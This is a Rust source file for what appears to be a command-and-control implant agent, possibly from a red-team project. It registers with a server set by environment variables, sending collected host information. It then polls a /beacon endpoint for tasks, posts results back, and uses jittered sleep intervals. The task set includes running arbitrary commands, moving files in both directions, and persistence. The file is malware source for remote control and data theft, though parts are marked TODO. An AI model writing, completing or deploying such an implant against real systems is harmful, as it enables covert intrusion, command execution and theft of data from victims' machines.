use crate::tasking::TaskingEngine;
use crate::util as native;
use rand::Rng;
use ::serde::{Serialize,Deserialize};
use serde_json::Value;
use uuid::Uuid;
use std::{error::Error};
use ureq::http::{Request,Response,StatusCode};

pub struct SharedConfig{
    pub sleep:u64,
    pub jitter:u64,
    pub exit:bool,
}

//Format of instruction received by agent
#[derive(Clone,Serialize,Deserialize,Debug)]
pub struct AgentTask{
    pub task_id:u64,
    pub agent_id:String,
    pub instruction:BeaconArgs,
    sent:bool,
    result:Option<TaskResult>
}

#[derive(Clone,Serialize,Deserialize,Debug)]
#[serde(tag="type",content="arguments",rename_all="snake_case")]
pub enum BeaconArgs
{
    Config{sleep:u64, jitter:u64}, 
    SetSleep(u64),
    SetJitter(u64),
    ExecCommand(String, Option<Vec<String>>),
    FileDownload(String),
    FileUpload(String),
    Pwd,
    ChangeDir,
    ListDirectory,
    Persist,
    End
}

#[derive(Clone,Serialize,Deserialize,Debug)]
pub enum TaskResult
{
    Text(Result<String,String>), //output string
    Binary(Result<Vec<u8>,String>), //binary stream
    Status(Result<(),String>), //status update -> empty tuple if success
    Shutdown
}
//Format of task results posted back to server
pub struct GetTaskResults{
    pub tasks:Vec<AgentTask>
}

pub struct ContinuedData{
    pub task_id:u64,
    pub status:String,
    pub error:Option<String>,
    //Upload/download data
    pub file_id: Option<String>,
    pub total_chunks: Option<u32>,
    pub chunk_num: Option<u32>,
    pub chunk_data: Option<String>,
}

pub struct Agent{
    pub shared_data:SharedConfig,
    pub tasking:TaskingEngine,
    uuid:Uuid
}

impl Agent{
    pub fn new()->Self{
        Self { 
            shared_data: SharedConfig { 
                //TODO: Load default sleep and jitter
                sleep: 30000, 
                jitter: 10000, 
                exit: false 
            }, 
            tasking: TaskingEngine::new() ,
            uuid:Uuid::nil()
            }
    }

    pub fn checkin(&mut self)->Result<(),Box<dyn Error>>{
        let host=std::env::var("SERVER_URL")?;
        let port=std::env::var("SERVER_PORT")?;
        //get JSON of collected info
        let info=native::get_checkin_info();
        self.uuid=ureq::post(format!("http://{}:{}/register",host.trim(),port.trim()))
        .send_json(&info)?
        .body_mut().read_json()?;
        Ok(())
    }

    pub fn get_tasks(&mut self, retries:u64)-> Result<Option<Vec<AgentTask>>, Box<dyn Error>>{
        let host=std::env::var("SERVER_URL")?;
        let port=std::env::var("SERVER_PORT")?;
        let response=ureq::get(format!("http://{}:{}/beacon",host.trim(),port.trim()))
        .header("Cookie", self.uuid.to_string())
        .call()?
        .body_mut().read_json::<Vec<AgentTask>>();
        if let Ok(tasks)=response{
            if (!tasks.is_empty()){
                Ok(Some(tasks)) 
            }
            else {
                Ok(None)
            }
        }
        else{
            Err("Beacon failed".into())
        }
    }

    pub fn send_results(
        &mut self, 
        completed_tasks:&[serde_json::Value]
    )-> Result<Option<Vec<AgentTask>>, Box<dyn Error>>{
        let host=std::env::var("SERVER_URL")?;
        let port=std::env::var("SERVER_PORT")?; 
        let mut response=ureq::post(format!("http://{}:{}/results",host.trim(),port.trim()))
            .send_json(&completed_tasks)?;
        /*
        TODO: Add logic for continued tasks that might be carried out over multiple beacons e.g. upload/download
        Change API endpoint to return Vec of just continued tasks
        Returns Ok(Vec) of continued tasks or Ok(None) if none available
        */
        Ok(None)
    }
    
    pub fn sleep(&mut self){
        let interval=calculate_sleep_interval(self.shared_data.sleep, self.shared_data.jitter);
        std::thread::sleep(std::time::Duration::from_millis(interval));
    }

}

pub fn calculate_sleep_interval(delay:u64, jitter:u64)->u64{
    let jitter=rand::thread_rng().gen_range(0..jitter+1);
    if (rand::random::<u8>()%2==0){
        delay+jitter
    }
    else if delay>jitter{
        delay-jitter
    }else{
        1
    }
}
